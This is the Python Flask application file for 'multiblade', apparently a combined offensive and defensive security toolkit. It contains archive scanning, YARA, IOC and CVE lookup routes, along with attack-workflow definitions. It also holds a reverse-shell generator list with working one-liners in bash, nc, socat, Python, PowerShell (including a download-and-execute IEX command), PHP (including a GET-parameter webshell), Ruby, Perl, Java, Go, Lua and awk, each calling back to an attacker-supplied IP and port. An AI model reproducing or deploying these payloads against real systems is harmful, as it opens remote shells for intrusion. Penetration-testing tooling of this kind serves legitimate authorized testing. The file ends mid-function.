import json
import os
import re
import stat
import tempfile
import urllib.error
import urllib.parse
import urllib.request

from flask import Flask, jsonify, render_template, request, Response
from werkzeug.exceptions import HTTPException
from werkzeug.utils import secure_filename

from zip_analyzer import ZipAnalyzer
from zip_analyzer.models import Severity
from zip_analyzer.tar_analyzer import TarAnalyzer
from zip_analyzer import database, stix_export
from zip_analyzer.tool_data import (get_all_tools, get_tool, get_categories,
                                    get_install, INSTALL_METHOD_META)
from zip_analyzer.port_data import PORTS

try:
    from werkzeug.serving import WSGIRequestHandler as _WRH
    _WRH.version_string = lambda self: "multiblade"
except Exception:
    pass

_TAR_SUFFIXES = {".tar", ".tgz", ".tbz2", ".txz", ".tar.gz", ".tar.bz2", ".tar.xz"}
_MAX_MB  = int(os.environ.get("MAX_UPLOAD_MB", "256"))
_DEBUG   = os.environ.get("FLASK_DEBUG", "0") == "1"

# ── Attack workflow definitions ────────────────────────────────────────────────
WORKFLOWS = [
    {
        "id": "full-recon",
        "name": "Full External Recon",
        "goal": "Map the complete attack surface of a target domain from the outside.",
        "tags": ["Recon"],
        "time": "30–60 min",
        "steps": ["subfinder", "amass", "dnsx", "httpx", "katana", "waybackurls"],
    },
    {
        "id": "web-app-audit",
        "name": "Web App Audit",
        "goal": "Systematically probe a web application from fingerprinting through exploitation.",
        "tags": ["Web"],
        "time": "1–3 hrs",
        "steps": ["httpx", "whatweb", "wafw00f", "nikto", "nuclei", "ffuf", "dalfox"],
    },
    {
        "id": "api-hunt",
        "name": "API Hunt",
        "goal": "Discover hidden API endpoints and test them for auth flaws and injection.",
        "tags": ["Web"],
        "time": "45–90 min",
        "steps": ["katana", "arjun", "ffuf", "nuclei", "jwt_tool"],
    },
    {
        "id": "port-sweep",
        "name": "Port & Service Sweep",
        "goal": "Find every open port at scale, then fingerprint services on each.",
        "tags": ["Network"],
        "time": "15–45 min",
        "steps": ["masscan", "nmap", "rustscan", "naabu", "httpx"],
    },
    {
        "id": "credential-attack",
        "name": "Credential Attack",
        "goal": "Enumerate accounts, spray passwords, crack hashes, and test Kerberos.",
        "tags": ["Network", "Recon"],
        "time": "Variable",
        "steps": ["kerbrute", "hydra", "medusa", "hashcat"],
    },
    {
        "id": "secrets-hunt",
        "name": "Secrets Hunt",
        "goal": "Find leaked credentials and secrets across code, archives, and web endpoints.",
        "tags": ["Recon", "Web"],
        "time": "20–40 min",
        "steps": ["trufflehog", "gitleaks", "semgrep", "linkfinder", "gau"],
    },
    {
        "id": "cloud-recon",
        "name": "Cloud Recon",
        "goal": "Enumerate cloud assets, misconfigurations, and exposed storage across providers.",
        "tags": ["Cloud"],
        "time": "30–60 min",
        "steps": ["shodan", "amass", "s3scanner", "pacu", "trivy"],
    },
    {
        "id": "mobile-assessment",
        "name": "Mobile Assessment",
        "goal": "Decompile, analyse, and instrument an Android APK for vulnerabilities.",
        "tags": ["Mobile"],
        "time": "2–4 hrs",
        "steps": ["apktool", "jadx", "semgrep", "frida", "objection"],
    },
    {
        "id": "dns-enum",
        "name": "DNS Enumeration",
        "goal": "Exhaustively enumerate subdomains, resolve records, and detect typosquatting.",
        "tags": ["Recon", "Network"],
        "time": "20–40 min",
        "steps": ["subfinder", "amass", "dnsx", "dnsrecon", "dnstwist", "fierce"],
    },
    {
        "id": "vuln-chain",
        "name": "Vuln Exploitation Chain",
        "goal": "Chain scanner output into targeted exploit attempts for common web vulns.",
        "tags": ["Web"],
        "time": "1–2 hrs",
        "steps": ["nuclei", "sqlmap", "commix", "ssrfmap", "tplmap"],
    },
]

# ── Reverse shell definitions ──────────────────────────────────────────────────
# Templates use {IP} and {PORT} as placeholders — replaced client-side in JS.
REVSHELLS = [
    # ── Bash ──────────────────────────────────────────────────────────────────
    {"id":"bash-tcp","name":"Bash TCP","os":"linux","os_icon":"🐧","tag":"bash",
     "template":"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"},
    {"id":"bash-196","name":"Bash 196","os":"linux","os_icon":"🐧","tag":"bash",
     "template":"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196"},
    {"id":"bash-readline","name":"Bash readline","os":"linux","os_icon":"🐧","tag":"bash",
     "template":"exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done"},
    {"id":"bash-udp","name":"Bash UDP","os":"linux","os_icon":"🐧","tag":"bash",
     "template":"sh -i >& /dev/udp/{IP}/{PORT} 0>&1"},
    # ── nc / socat ─────────────────────────────────────────────────────────────
    {"id":"nc-e","name":"nc -e /bin/bash","os":"linux","os_icon":"🐧","tag":"nc",
     "template":"nc {IP} {PORT} -e /bin/bash"},
    {"id":"nc-mkfifo","name":"nc mkfifo (no -e)","os":"linux","os_icon":"🐧","tag":"nc",
     "template":"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {IP} {PORT} >/tmp/f"},
    {"id":"nc-ncat","name":"ncat","os":"any","os_icon":"✦","tag":"nc",
     "template":"ncat {IP} {PORT} -e /bin/bash"},
    {"id":"nc-windows","name":"nc Windows","os":"windows","os_icon":"🪟","tag":"nc",
     "template":"nc.exe {IP} {PORT} -e cmd.exe"},
    {"id":"socat","name":"socat","os":"linux","os_icon":"🐧","tag":"nc",
     "template":"socat TCP:{IP}:{PORT} EXEC:/bin/bash"},
    {"id":"socat-pty","name":"socat PTY (full TTY)","os":"linux","os_icon":"🐧","tag":"nc",
     "template":"socat TCP:{IP}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"},
    # ── Python ────────────────────────────────────────────────────────────────
    {"id":"python3","name":"Python 3","os":"any","os_icon":"✦","tag":"python",
     "template":"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"},
    {"id":"python2","name":"Python 2","os":"any","os_icon":"✦","tag":"python",
     "template":"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"},
    {"id":"python3-win","name":"Python 3 Windows","os":"windows","os_icon":"🪟","tag":"python",
     "template":"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{IP}\",{PORT}));[subprocess.call([\"cmd.exe\"],stdin=s,stdout=s,stderr=s)]'"},
    # ── PowerShell ────────────────────────────────────────────────────────────
    {"id":"powershell-1","name":"PowerShell #1","os":"windows","os_icon":"🪟","tag":"ps",
     "template":"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sb = (iex $data 2>&1 | Out-String);$sb2 = $sb+'PS '+(pwd).Path+'> ';$sb3 = ([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb3,0,$sb3.Length);$stream.Flush()};$client.Close()\""},
    {"id":"powershell-iex","name":"PowerShell IEX download","os":"windows","os_icon":"🪟","tag":"ps",
     "template":"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{IP}:{PORT}/shell.ps1')\""},
    {"id":"powershell-revps","name":"PowerShell reverse (ConPtyShell)","os":"windows","os_icon":"🪟","tag":"ps",
     "template":"IEX(IWR http://{IP}:{PORT}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {IP} {PORT}"},
    # ── PHP ───────────────────────────────────────────────────────────────────
    {"id":"php-exec","name":"PHP exec","os":"web","os_icon":"🌐","tag":"php",
     "template":"php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"},
    {"id":"php-popen","name":"PHP popen","os":"web","os_icon":"🌐","tag":"php",
     "template":"php -r '$sock=fsockopen(\"{IP}\",{PORT});popen(\"/bin/sh -i <&3 >&3 2>&3\",\"r\");'"},
    {"id":"php-shell_exec","name":"PHP shell_exec (file)","os":"web","os_icon":"🌐","tag":"php",
     "template":"<?php exec(\"/bin/bash -c 'bash -i >/dev/tcp/{IP}/{PORT} 0>&1'\"); ?>"},
    {"id":"php-system","name":"PHP webshell","os":"web","os_icon":"🌐","tag":"php",
     "template":"<?php system($_GET['cmd']); ?>"},
    # ── Ruby / Perl / Java / Go / Lua / awk ──────────────────────────────────
    {"id":"ruby","name":"Ruby","os":"any","os_icon":"✦","tag":"ruby",
     "template":"ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"},
    {"id":"perl","name":"Perl","os":"any","os_icon":"✦","tag":"perl",
     "template":"perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"},
    {"id":"perl-win","name":"Perl Windows","os":"windows","os_icon":"🪟","tag":"perl",
     "template":"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{IP}:{PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
    {"id":"java","name":"Java","os":"any","os_icon":"✦","tag":"java",
     "template":"Runtime r=Runtime.getRuntime();String[] cmd={\"bash\",\"-c\",\"exec 5<>/dev/tcp/{IP}/{PORT};cat<&5|while read l;do $l 2>&5>&5;done\"};Process p=r.exec(cmd);p.waitFor();"},
    {"id":"go","name":"Go","os":"any","os_icon":"✦","tag":"go",
     "template":'package main\nimport("net";"os/exec")\nfunc main(){\n  c,_:=net.Dial("tcp","{IP}:{PORT}")\n  cmd:=exec.Command("/bin/sh")\n  cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c\n  cmd.Run()\n}'},
    {"id":"lua","name":"Lua","os":"linux","os_icon":"🐧","tag":"lua",
     "template":"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{IP}',{PORT});os.execute('/bin/sh -i <&3 >&3 2>&3');\""},
    {"id":"awk","name":"awk","os":"linux","os_icon":"🐧","tag":"awk",
     "template":"awk 'BEGIN{s=\"/inet/tcp/0/{IP}/{PORT}\";while(42){do{printf\"$ \"|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!=\"exit\")close(s)}}' /dev/stdin"},
]


_ALLOWED_EXT = {
    ".zip", ".jar", ".apk", ".war", ".ear",
    ".tar", ".tgz", ".tbz2", ".txz",
    ".gz", ".bz2", ".xz",
}

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = _MAX_MB * 1024 * 1024


@app.context_processor
def inject_tool_stats():
    return {"tool_count": len(get_all_tools()), "category_count": len(get_categories())}

# Initialise database on startup
database.init()


# ── Security headers ──────────────────────────────────────────────────────────

@app.after_request
def _security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "no-referrer"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
        "font-src https://fonts.gstatic.com; "
        "img-src 'self' data:; "
        "connect-src 'self'; "
        "frame-ancestors 'none'"
    )
    response.headers["Permissions-Policy"] = (
        "camera=(), microphone=(), geolocation=(), payment=()"
    )
    response.headers["X-Permitted-Cross-Domain-Policies"] = "none"
    return response


# ── Helpers ───────────────────────────────────────────────────────────────────

SEV_ORDER = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]

# System directory prefixes that must never be registered as watch folders.
_SYSTEM_PATH_PREFIXES = (
    "/etc", "/usr", "/bin", "/sbin", "/lib", "/lib64",
    "/boot", "/sys", "/proc", "/dev",
    "/System", "/Library", "/private/etc",
)


def _body_json() -> dict:
    """Return request JSON body as a dict; non-dict bodies (arrays, scalars) return {}."""
    body = request.get_json(silent=True)
    return body if isinstance(body, dict) else {}


def _str_field(val, default: str = "", max_len: int = None) -> str:
    """Coerce a JSON field to str safely. Non-string types return default."""
    if not isinstance(val, str):
        return default
    return val[:max_len] if max_len else val


def _int_param(name: str, default: int, min_val: int = None, max_val: int = None) -> int:
    """Parse an integer query parameter, clamping to [min_val, max_val]."""
    try:
        v = int(request.args.get(name, default))
    except (ValueError, TypeError):
        v = default
    if min_val is not None:
        v = max(min_val, v)
    if max_val is not None:
        v = min(max_val, v)
    return v


def _allowed_file(filename: str) -> bool:
    lower = filename.lower()
    for compound in (".tar.gz", ".tar.bz2", ".tar.xz"):
        if lower.endswith(compound):
            return True
    dot = lower.rfind(".")
    return dot != -1 and lower[dot:] in _ALLOWED_EXT


def _get_analyzer(filename: str):
    lower = filename.lower()
    if any(lower.endswith(s) for s in _TAR_SUFFIXES):
        return TarAnalyzer()
    return ZipAnalyzer()


def result_to_json(result, display_filename: str, filesize: int) -> dict:
    findings = []
    for f in sorted(result.findings, key=lambda x: SEV_ORDER.index(x.severity)):
        findings.append({
            "severity":    f.severity.value,
            "check":       f.check,
            "description": f.description,
            "filename":    f.filename,
            "detail":      f.detail,
        })
    return {
        "filename":       display_filename,
        "filesize":       filesize,
        "safe":           result.safe,
        "error":          result.error,
        "findings":       findings,
        "max_severity":   result.max_severity.value if result.max_severity else None,
        "finding_counts": {
            sev.value: sum(1 for f in result.findings if f.severity == sev)
            for sev in Severity
        },
        "metrics": result.metrics or {},
    }


def _csrf_check():
    """CSRF guard for this localhost-only tool.

    Blocks three attack vectors:
      1. Cross-origin Origin header  — browser always sets this for cross-site XHR.
      2. Cross-origin Referer header — set by browser for cross-site form posts.
      3. application/x-www-form-urlencoded content-type — the classic CSRF form
         payload; our JSON APIs must never accept it.

    Intentionally allows requests with no Origin/Referer (e.g. curl, direct API
    calls) since Private Network Access policy (Chrome 94+/Firefox 90+) already
    prevents public websites from reaching localhost in modern browsers.
    """
    origin  = request.headers.get("Origin",  "")
    referer = request.headers.get("Referer", "")
    ct      = request.content_type or ""

    if origin  and not origin.startswith(("http://localhost", "http://127.0.0.1")):
        return False
    if referer and not referer.startswith(("http://localhost", "http://127.0.0.1")):
        return False
    # Browsers send this content-type for form submissions — our APIs never need it.
    if "application/x-www-form-urlencoded" in ct:
        return False
    return True


# ── Error handlers ────────────────────────────────────────────────────────────

@app.errorhandler(413)
def handle_too_large(_e):
    return jsonify({"error": f"File too large — maximum {_MAX_MB} MB"}), 413


@app.errorhandler(HTTPException)
def handle_http(e):
    # Return HTML for browser page requests, JSON for API/XHR requests
    if request.accept_mimetypes.best_match(["text/html", "application/json"]) == "text/html":
        return render_template("error.html", code=e.code, message=e.description,
                               active_page=""), e.code
    return jsonify({"error": f"{e.code}: {e.description}"}), e.code


@app.errorhandler(Exception)
def handle_exc(_e):
    return jsonify({"error": "Internal server error"}), 500


# ── Page routes ───────────────────────────────────────────────────────────────

@app.route("/")
def landing():
    return render_template("landing.html")


@app.route("/platform")
def platform_hub():
    stats = database.scan_stats()
    return render_template("hub.html", stats=stats, active_page="analyzer")


@app.route("/generators")
def generators():
    tools      = get_all_tools()
    categories = get_categories()
    return render_template("generators.html", tools=tools, categories=categories,
                           active_page="generators")


@app.route("/generators/workflows")
def workflows():
    from zip_analyzer.tool_data import TOOLS_BY_SLUG
    return render_template("workflows.html", workflows=WORKFLOWS,
                           tools_by_slug=TOOLS_BY_SLUG, active_page="workflows")


@app.route("/generators/revshells")
def revshells():
    return render_template("revshells.html", shells=REVSHELLS, active_page="revshells")


@app.route("/tools/encode")
def encode_tool():
    return render_template("encode.html", active_page="encode")


@app.route("/tools/hashid")
def hashid_tool():
    return render_template("hashid.html", active_page="hashid")


@app.route("/generators/<slug>")
def generator_tool(slug):
    tool = get_tool(slug)
    if not tool:
        from flask import abort
        abort(404)
    related = [t for t in get_all_tools()
               if t["category"] == tool["category"] and t["slug"] != slug][:4]
    install = get_install(slug)
    return render_template("generator_tool.html", tool=tool, related=related,
                           install=install, install_meta=INSTALL_METHOD_META,
                           active_page="generators")


@app.route("/analyzer")
def analyzer():
    return render_template("index.html", active_page="analyzer")


@app.route("/history")
def history():
    return render_template("history.html", active_page="history")


@app.route("/triage")
def triage():
    return render_template("triage.html", active_page="triage")


@app.route("/compare")
def compare():
    return render_template("compare.html", active_page="compare")


@app.route("/yara")
def yara_page():
    return render_template("yara.html", active_page="yara")


@app.route("/campaigns")
def campaigns():
    return render_template("campaigns.html", active_page="campaigns")


@app.route("/custom-checks")
def custom_checks():
    return render_template("custom_checks.html", active_page="custom")


@app.route("/watch")
def watch():
    return render_template("watch.html", active_page="watch")


@app.route("/curl")
def curl_gen():
    return render_template("curl.html", active_page="curl")


# ── Reference Library ─────────────────────────────────────────────────────────

@app.route("/reference/ports")
def reference_ports():
    return render_template("reference_ports.html",
                           ports_json=json.dumps(PORTS),
                           active_page="ref-ports")


@app.route("/reference/cve")
def reference_cve():
    return render_template("reference_cve.html", active_page="ref-cve")


@app.route("/reference/wordlists")
def reference_wordlists():
    return render_template("reference_wordlists.html", active_page="ref-wordlists")


@app.route("/api/cve")
def api_cve_search():
    # Strip null bytes and control characters; truncate to 100 chars
    q = request.args.get("q", "").strip().replace("\x00", "")[:100]
    if len(q) < 2:
        return jsonify({"error": "Query too short (min 2 chars)"}), 400

    try:
        limit = min(max(1, int(request.args.get("limit", 15))), 20)
        start = max(0, int(request.args.get("start", 0)))
    except (ValueError, TypeError):
        limit, start = 15, 0

    is_cve_id = q.upper().startswith("CVE-")
    if is_cve_id:
        params = urllib.parse.urlencode({"cveId": q.upper(), "resultsPerPage": 1})
    else:
        params = urllib.parse.urlencode({"keywordSearch": q, "resultsPerPage": limit, "startIndex": start})

    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?{params}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Multiblade/1.0 Security Platform"})
        with urllib.request.urlopen(req, timeout=10) as r:
            raw = json.loads(r.read())
    except (urllib.error.URLError, OSError) as exc:
        # OSError covers TimeoutError, socket.timeout, and other network-level failures
        return jsonify({"error": f"NVD API unavailable: {exc}"}), 503
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500

    results = []
    for item in raw.get("vulnerabilities", []):
        cve = item["cve"]
        cve_id = cve["id"]
        desc = next((d["value"] for d in cve.get("descriptions", []) if d["lang"] == "en"), "No description.")
        metrics = cve.get("metrics", {})
        score = None
        severity = None
        vector = None
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if metrics.get(key):
                m = metrics[key][0]
                cd = m.get("cvssData", {})
                score = cd.get("baseScore")
                severity = cd.get("baseSeverity") or m.get("baseSeverity")
                vector = cd.get("vectorString")
                break
        cwes = [w["description"][0]["value"] for w in cve.get("weaknesses", [])
                if w.get("description")]
        results.append({
            "id": cve_id,
            "desc": desc[:400],
            "score": score,
            "severity": severity,
            "vector": vector,
            "cwes": cwes[:3],
            "published": cve.get("published", "")[:10],
            "modified": cve.get("lastModified", "")[:10],
        })

    return jsonify({"total": raw.get("totalResults", 0), "results": results})


# ── Standalone Tools (JWT, Subnet, Payloads) ─────────────────────────────────

@app.route("/tools/jwt")
def jwt_tool():
    return render_template("jwt_tool.html", active_page="jwt")


@app.route("/tools/subnet")
def subnet_tool():
    return render_template("subnet_tool.html", active_page="subnet")


@app.route("/tools/payloads")
def payloads_tool():
    return render_template("payloads_tool.html", active_page="payloads")


# ── Network Security Tools (Phase 12) ────────────────────────────────────────

@app.route("/tools/netfilter")
def netfilter():
    return render_template("netfilter.html", active_page="netfilter")


@app.route("/tools/ids-rule")
def ids_rule():
    return render_template("ids_rule.html", active_page="ids-rule")


@app.route("/tools/scapy")
def scapy_tool():
    return render_template("scapy_tool.html", active_page="scapy")


@app.route("/reference/protocols")
def reference_protocols():
    from zip_analyzer.protocol_data import PROTOCOLS
    return render_template("reference_protocols.html",
                           protocols=PROTOCOLS,
                           active_page="ref-protocols")


# ── Offensive Tooling (Phase 13) ─────────────────────────────────────────────

@app.route("/generators/ad-auth")
def ad_auth_tool():
    return render_template("ad_auth.html", active_page="ad-auth")


@app.route("/reference/waf-bypass")
def waf_bypass():
    return render_template("waf_bypass.html", active_page="ref-waf")


@app.route("/reference/c2")
def c2_reference():
    return render_template("c2_reference.html", active_page="ref-c2")


# ── Defensive Tooling (Phase 14) ─────────────────────────────────────────────

@app.route("/tools/logparse")
def logparse_tool():
    return render_template("logparse.html", active_page="logparse")


@app.route("/tools/ioc")
def ioc_tool():
    return render_template("ioc_tool.html", active_page="ioc")


@app.route("/tools/tls")
def tls_tool():
    return render_template("tls_tool.html", active_page="tls")


@app.route("/api/tls")
def api_tls():
    import ssl, socket, datetime, json as _json
    domain = request.args.get("domain", "").strip().lower()
    # Reject obviously invalid input
    if not domain or not re.match(r'^[a-zA-Z0-9\.\-]{1,253}$', domain) or '..' in domain:
        return jsonify({"error": "Invalid domain"}), 400
    port = 443
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, port), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cert      = ssock.getpeercert()
                cipher    = ssock.cipher()
                version   = ssock.version()
                der       = ssock.getpeercert(binary_form=True)
        # Parse cert fields
        subject   = dict(x[0] for x in cert.get("subject", []))
        issuer    = dict(x[0] for x in cert.get("issuer", []))
        san_raw   = cert.get("subjectAltName", [])
        sans      = [v for t, v in san_raw if t == "DNS"]
        not_after = cert.get("notAfter", "")
        not_before= cert.get("notBefore", "")
        serial    = cert.get("serialNumber", "")
        # Days until expiry
        try:
            exp_dt  = datetime.datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
            now_dt  = datetime.datetime.utcnow()
            days_left = (exp_dt - now_dt).days
        except Exception:
            days_left = None
        import hashlib
        sha256_fp = hashlib.sha256(der).hexdigest().upper()
        fp_fmt    = ":".join(sha256_fp[i:i+2] for i in range(0, len(sha256_fp), 2))
        return jsonify({
            "domain":     domain,
            "subject_cn": subject.get("commonName", ""),
            "issuer_cn":  issuer.get("commonName", ""),
            "issuer_org": issuer.get("organizationName", ""),
            "sans":       sans,
            "not_before": not_before,
            "not_after":  not_after,
            "days_left":  days_left,
            "serial":     serial,
            "cipher":     cipher[0] if cipher else "",
            "tls_version":version or "",
            "sha256_fp":  fp_fmt,
        })
    except ssl.SSLCertVerificationError as e:
        return jsonify({"error": f"Certificate verification failed: {e}"}), 502
    except (socket.timeout, TimeoutError):
        return jsonify({"error": "Connection timed out"}), 504
    except OSError as e:
        return jsonify({"error": f"Connection failed: {e}"}), 502
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Engagement / Playbooks ─────────────────────────────────────────────────────

@app.route("/playbook")
def playbook():
    entries      = database.get_playbook_entries()
    engagements  = database.get_engagement_names()
    grouped: dict = {}
    for e in entries:
        grouped.setdefault(e["engagement"], []).append(e)
    return render_template("playbook.html",
                           grouped=grouped,
                           engagements=engagements,
                           active_page="playbook")


@app.route("/api/playbooks", methods=["GET"])
def api_playbooks_list():
    eng     = request.args.get("engagement", "").strip()[:100]
    entries = database.get_playbook_entries(eng or None)
    names   = database.get_engagement_names()
    return jsonify({"entries": entries, "engagements": names})


@app.route("/api/playbooks", methods=["POST"])
def api_playbooks_save():
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    data       = _body_json()
    engagement = str(data.get("engagement") or "default").strip()[:100]
    tool_slug  = str(data.get("tool_slug")  or "").strip()[:80]
    tool_name  = str(data.get("tool_name")  or "").strip()[:120]
    command    = str(data.get("command")    or "").strip()[:8000]
    note       = str(data.get("note")       or "").strip()[:400]
    if not tool_slug or not command:
        return jsonify({"error": "tool_slug and command are required"}), 400
    entry_id = database.save_playbook_entry(engagement, tool_slug, tool_name, command, note)
    return jsonify({"ok": True, "id": entry_id}), 201


@app.route("/api/playbooks/<int:entry_id>", methods=["DELETE"])
def api_playbooks_delete(entry_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    database.delete_playbook_entry(entry_id)
    return jsonify({"ok": True})


# ── MITRE ATT&CK ───────────────────────────────────────────────────────────────

@app.route("/mitre")
def mitre():
    return render_template("mitre.html", active_page="mitre")


# ── Core scan endpoint ────────────────────────────────────────────────────────

@app.route("/analyze", methods=["POST"])
def analyze():
    if not _csrf_check():
        return jsonify({"error": "Cross-origin requests are not permitted"}), 403

    if "file" not in request.files:
        return jsonify({"error": "No file uploaded"}), 400

    file = request.files["file"]
    if not file.filename:
        return jsonify({"error": "Empty filename"}), 400

    if not _allowed_file(file.filename):
        return jsonify({"error": "Unsupported file type"}), 400

    display_name = secure_filename(file.filename) or "upload"

    fd, tmp_path = tempfile.mkstemp(suffix=".zip")
    os.chmod(tmp_path, stat.S_IRUSR | stat.S_IWUSR)
    try:
        with os.fdopen(fd, "wb") as fh:
            file.save(fh)

        filesize  = os.path.getsize(tmp_path)
        scanner   = _get_analyzer(file.filename)

        # Load custom checks and pass them in
        custom = database.get_custom_checks()
        result = scanner.analyze(tmp_path, custom_checks=custom)

        data = result_to_json(result, display_name, filesize)

        # Auto-save to history
        try:
            scan_id = database.save_scan(data)
            data["scan_id"] = scan_id
        except Exception:
            pass

        return jsonify(data)
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


# ── History API ───────────────────────────────────────────────────────────────

@app.route("/api/scans")
def api_scans():
    limit  = _int_param("limit",  default=200, min_val=1, max_val=500)
    offset = _int_param("offset", default=0,   min_val=0)
    return jsonify(database.get_scans(limit, offset))


@app.route("/api/scans/<int:scan_id>")
def api_scan(scan_id):
    scan = database.get_scan(scan_id)
    if not scan:
        return jsonify({"error": "Not found"}), 404
    return jsonify(scan)


@app.route("/api/scans/<int:scan_id>", methods=["DELETE"])
def api_delete_scan(scan_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    database.delete_scan(scan_id)
    return jsonify({"ok": True})


@app.route("/api/scans/<int:scan_id>", methods=["PATCH"])
def api_update_scan(scan_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    body   = _body_json()
    notes  = body.get("notes")
    status = body.get("status")
    valid_statuses = {"new", "reviewed", "escalated", "false_positive"}
    if status is not None and not isinstance(status, str):
        return jsonify({"error": "Invalid status"}), 400
    if status and status not in valid_statuses:
        return jsonify({"error": "Invalid status"}), 400
    if notes is not None:
        if not isinstance(notes, str):
            return jsonify({"error": "notes must be a string"}), 400
        if len(notes) > 10_000:
            return jsonify({"error": "Notes exceeds maximum length (10 000 chars)"}), 400
    database.update_scan(scan_id, notes=notes, status=status)
    return jsonify({"ok": True})


@app.route("/api/ioc-pivot")
def api_ioc_pivot():
    q = request.args.get("q", "").strip()
    if len(q) < 3:
        return jsonify({"error": "Query too short (min 3 chars)"}), 400
    # Strip SQL LIKE wildcards for the minimum-length check so that a query
    # consisting only of wildcards (e.g. "%%%") doesn't trigger a full-table scan.
    non_wildcard = q.replace("%", "").replace("_", "")
    if len(non_wildcard) < 3:
        return jsonify({"error": "Query must contain at least 3 non-wildcard characters"}), 400
    return jsonify(database.pivot_ioc(q))


# ── Export endpoints ──────────────────────────────────────────────────────────

@app.route("/api/scans/<int:scan_id>/stix")
def api_stix(scan_id):
    scan = database.get_scan(scan_id)
    if not scan:
        return jsonify({"error": "Not found"}), 404
    bundle = stix_export.to_stix_bundle(scan)
    return Response(
        json.dumps(bundle, indent=2),
        mimetype="application/json",
        headers={"Content-Disposition": f'attachment; filename="stix_{scan_id}.json"'},
    )


@app.route("/api/scans/<int:scan_id>/navigator")
def api_navigator(scan_id):
    scan = database.get_scan(scan_id)
    if not scan:
        return jsonify({"error": "Not found"}), 404
    layer = stix_export.to_navigator_layer(scan)
    return Response(
        json.dumps(layer, indent=2),
        mimetype="application/json",
        headers={"Content-Disposition": f'attachment; filename="navigator_{scan_id}.json"'},
    )


# ── YARA playground API ───────────────────────────────────────────────────────

@app.route("/api/yara-drafts")
def api_yara_drafts():
    return jsonify(database.get_yara_drafts())


@app.route("/api/yara-drafts", methods=["POST"])
def api_save_yara_draft():
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    body    = _body_json()
    name    = (_str_field(body.get("name"), "Untitled", max_len=80) or "Untitled")
    content = _str_field(body.get("content"), "", max_len=None)
    if len(content) > 65_536:
        return jsonify({"error": "YARA rule content too large (max 64 KB)"}), 400
    draft_id = database.save_yara_draft(name, content)
    return jsonify({"id": draft_id})


@app.route("/api/yara-drafts/<int:draft_id>", methods=["PATCH"])
def api_update_yara_draft(draft_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    body    = _body_json()
    content = body.get("content")
    if content is not None:
        if not isinstance(content, str):
            return jsonify({"error": "content must be a string"}), 400
        if len(content) > 65_536:
            return jsonify({"error": "YARA rule content too large (max 64 KB)"}), 400
    database.update_yara_draft(draft_id, content=content)
    return jsonify({"ok": True})


@app.route("/api/yara-drafts/<int:draft_id>", methods=["DELETE"])
def api_delete_yara_draft(draft_id):
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403
    database.delete_yara_draft(draft_id)
    return jsonify({"ok": True})


@app.route("/api/yara-test", methods=["POST"])
def api_yara_test():
    if not _csrf_check():
        return jsonify({"error": "Forbidden"}), 403

    body    = _body_json()
    rule    = _str_field(body.get("rule")).strip()
    scan_id = body.get("scan_id")

    if not rule:
        return jsonify({"error": "No rule provided"}), 400
    if len(rule) > 65_536:
